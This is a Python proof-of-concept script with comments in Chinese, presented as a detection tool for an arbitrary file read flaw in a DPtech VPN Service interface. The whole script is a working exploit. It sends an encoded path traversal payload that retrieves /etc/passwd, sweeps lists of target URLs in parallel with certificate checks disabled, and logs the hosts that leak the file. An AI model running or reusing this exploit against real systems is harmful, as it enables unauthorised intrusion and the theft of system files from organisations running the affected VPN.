import requests
from urllib3.exceptions import InsecureRequestWarning
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm


def check_vulnerability(url, timeout=2):
    try:
        poc = "/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
        url = url + poc
        response = requests.get(url=url, verify=False, timeout=timeout)
        if "root" in response.text:
            print(f"发现漏洞: {url}")
            return (url, "存在漏洞")
    except requests.exceptions.RequestException as e:
        return (url, "请求异常: " + str(e))
    return (url, "无漏洞")


def write_results(vulnerability_results):
    with open("data.txt", "a") as data_file, open("filedata.txt", "a") as filedata_file:
        for url, status in vulnerability_results:
            if status == "存在漏洞":
                data_file.write(url + "\n")
            filedata_file.write(url + " - " + status + "\n")


def main(urls, max_threads=10, timeout=2):
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    vulnerability_results = []

    with ThreadPoolExecutor(max_threads) as executor:
        futures = [executor.submit(
            check_vulnerability, url, timeout) for url in urls]
        for future in tqdm(as_completed(futures), total=len(urls), desc="\n总进度"):
            result = future.result()
            if result:
                vulnerability_results.append(result)

    write_results(vulnerability_results)


if __name__ == "__main__":
    print("欢迎使用迪普VPN Service 接口存在任意文件读取漏洞检测工具！")
    print("-----------------------------------------------------------")
    print("微信公众号:知攻善防实验室!!")
    print("-----------------------------------------------------------")
    parser = argparse.ArgumentParser(description="检测URL是否存在漏洞")
    parser.add_argument("-u", "--url", required=False, help="需要检测的URL")
    parser.add_argument("-f", "--file", required=False, help="包含多个URL的文件路径")
    args = parser.parse_args()

    if args.file:
        with open(args.file, 'r') as f:
            urls = [line.strip() for line in f.readlines()]
    elif args.url:
        urls = [args.url]
    else:
        print("请在添加 -h 获取提示信息！!!")
        exit()

    main(urls)
